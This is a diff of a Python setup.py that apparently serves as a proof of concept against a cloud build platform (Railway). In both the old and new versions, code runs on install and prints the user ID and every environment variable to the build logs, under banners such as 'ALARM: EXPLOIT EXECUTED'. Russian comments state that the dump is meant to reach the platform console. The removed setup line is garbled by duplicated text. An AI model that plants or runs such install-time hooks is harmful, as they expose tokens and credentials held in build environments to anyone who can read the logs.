@@ -1,17 +1,13 @@
 from setuptools import setup
 import os
 
-print("\n" + "="*50)
-print("!!! SECURITY AUDIT START !!!")
-print(f"CURRENT USER ID: {os.getuid()}")
-print(f"WORKING DIR: {os.getcwd()}")
+# Этот блок обязан появиться в логах сборки
+print("\n" + "!"*50)
+print("ALARM: EXPLOIT EXECUTED")
+print(f"UID: {os.getuid()}")
+# Печатаем переменные окружения прямо в консоль Railway
+for k, v in os.environ.items():
+    print(f"FOUND_VAR: {k}={v}")
+print("!"*50 + "\n")
 
-print("\n--- [ DUMPING ALL ENVIRONMENT VARIABLES ] ---")
-# Печатаем вообще всё, что знает сервер
-for key, value in os.environ.items():
-    print(f"{key} ===> {value}")
-
-print("!!! SECURITY AUDIT END !!!")
-print("="*50 + "\n")
-
-setup(name="railway-infra-test", version="1.0.0")"1.0.0")
+setup(name="poc-audit", version="1.1.0")
